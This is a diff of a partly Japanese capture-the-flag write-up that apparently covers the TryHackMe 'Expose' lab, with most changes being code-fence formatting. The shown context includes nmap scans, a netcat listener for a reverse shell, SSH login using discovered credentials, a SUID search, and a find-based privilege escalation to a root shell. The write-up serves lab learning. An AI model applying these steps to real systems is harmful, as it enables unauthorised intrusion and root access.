@@ -33,14 +33,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -sV -sT -sC $ip
-```
-
-```
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~/tools]
 └─$ nmap -sV -sT -sC $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:53 JST
@@ -91,7 +87,7 @@ Nmap done: 1 IP address (1 host up) scanned in 49.12 seconds
 
 ### 探索
 
-```
+```bash
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~/tools]
 └─$ nmap -sV -sT -sC $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:53 JST
@@ -168,7 +164,7 @@ ftp> exit
 隠れてたポートがあった。
 網羅的にやるなら全ポートをポートスキャンすべしだね。しよう。
 
-```
+```bash
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~]
 └─$ time nmap -p- -sC -sV -T4 $ip                                                                                  
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 21:01 JST
@@ -496,7 +492,7 @@ fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
 リバースシェルは成功したけど権限が足りなかった。
 sshのログイン情報らしきものがあったからそこからログインした
 
-```
+```bash
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~]
 └─$ nc -lvnp 3333                                                                                                  
 listening on [any] 3333 ...
@@ -604,11 +600,8 @@ zeamkish@ip-10-10-123-251:~$
 
 SUIDが設定されてて利用できるコマンドがないか確認
 
-```
+```bash
 find / -perm -4000 2>/dev/null
-```
-
-```
 zeamkish@ip-10-10-123-251:~$  find / -perm -4000 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/openssh/ssh-keysign
@@ -638,11 +631,8 @@ findが使えそうだったから探してみる
 
 -pを設定することで管理者権限でシェルを起動できる
 
-```
+```bash
 find . -exec /bin/sh -p \; -quit
-```
-
-```
 zeamkish@ip-10-10-123-251:~$ find . -exec /bin/sh -p \; -quit
 bash-5.0# ls -la
 total 36
@@ -674,7 +664,6 @@ bash-5.0#
 - サーバー内のファイルシステムへのアクセスとフラグの取得
 
 これらの手順は一般的なペネトレーションテストの流れを示していますが、具体的な詳細や完全な解決方法については提供されたコンテキストからは確認できません。
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
@@ -690,8 +679,6 @@ During the privilege escalation phase, we will prioritize checking for misconfig
 This command is executed during privilege escalation to validate local misconfigurations and escalation paths. We are looking for delegated execution rights, writable sensitive paths, or credential artifacts. Any positive result is immediately chained into a higher-privilege execution attempt.
 ```bash
 ssh zeamkish@$ip
-```
-```bash
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~/work/thm/Expose]
 └─$ ssh zeamkish@$ip                                                                                  
 The authenticity of host '10.10.123.251 (10.10.123.251)' can't be established.
